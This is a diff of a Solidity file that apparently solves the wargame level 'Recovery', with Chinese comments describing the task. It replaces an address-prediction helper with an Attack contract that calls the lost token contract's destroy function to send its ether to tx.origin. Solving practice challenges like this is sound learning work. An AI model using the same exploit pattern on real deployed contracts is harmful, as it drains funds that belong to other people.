@@ -6,7 +6,7 @@ pragma solidity ^0.8.0;
  * 在部署了一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 后边他们丢失了合约地址。
  * 如果您能从丢失的的合约地址中找回(或移除)，则顺利通过此关。
  *
- * 初步思路：使用地址预测，new的时候没有指定salt，所以使用的是create不是create2
+ * 初步思路：区块链上所有东西都是透明的，因此可以直接查看创建的区款链地址
  */
 contract Recovery {
     //generate tokens
@@ -48,7 +48,7 @@ contract SimpleToken {
 }
 
 contract Attack {
-    function calculateAddr(address createAddr, uint256 nonce) public view returns(address) {
-        return address(uint160(uint256(keccak256(abi.encodePacked(createAddr, nonce)))));
+    function attack(SimpleToken addr) public {
+        addr.destroy(payable(tx.origin));
     }
 }
